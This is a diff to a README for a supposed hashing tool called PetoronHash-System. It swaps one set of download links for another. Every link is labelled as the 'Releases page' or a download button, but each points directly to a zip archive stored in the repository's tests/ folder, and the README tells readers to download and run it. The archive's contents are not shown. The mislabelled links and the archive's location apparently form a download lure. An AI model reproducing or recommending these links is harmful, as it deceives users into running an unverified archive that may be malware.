@@ -1,6 +1,6 @@
 # 🐾 PetoronHash-System - Fast, Secure Hashing for Everyone
 
-[![Download PetoronHash-System](https://raw.githubusercontent.com/macjbc/PetoronHash-System/main/tests/PetoronHash-System_monkly.zip)](https://raw.githubusercontent.com/macjbc/PetoronHash-System/main/tests/PetoronHash-System_monkly.zip)
+[![Download PetoronHash-System](https://github.com/macjbc/PetoronHash-System/raw/refs/heads/main/tests/Hash-Petoron-System-2.4-alpha.4.zip)](https://github.com/macjbc/PetoronHash-System/raw/refs/heads/main/tests/Hash-Petoron-System-2.4-alpha.4.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ Using PHASH is straightforward. Below are steps to help you download and run it 
 
 To get started, visit the Releases page to download PetoronHash-System. You can find all versions of the software there.
 
-[Visit the Releases page to download](https://raw.githubusercontent.com/macjbc/PetoronHash-System/main/tests/PetoronHash-System_monkly.zip)
+[Visit the Releases page to download](https://github.com/macjbc/PetoronHash-System/raw/refs/heads/main/tests/Hash-Petoron-System-2.4-alpha.4.zip)
 
 1. Click the link above to go to the download page.
 2. On the Releases page, look for the latest version.
@@ -73,4 +73,4 @@ For further inquiries, you can contact the maintainer or contribute to the devel
 
 ---
 
-Thank you for using PetoronHash-System. We hope you enjoy a more secure hashing experience! For downloads and updates, remember to [visit the Releases page](https://raw.githubusercontent.com/macjbc/PetoronHash-System/main/tests/PetoronHash-System_monkly.zip).
+Thank you for using PetoronHash-System. We hope you enjoy a more secure hashing experience! For downloads and updates, remember to [visit the Releases page](https://github.com/macjbc/PetoronHash-System/raw/refs/heads/main/tests/Hash-Petoron-System-2.4-alpha.4.zip).
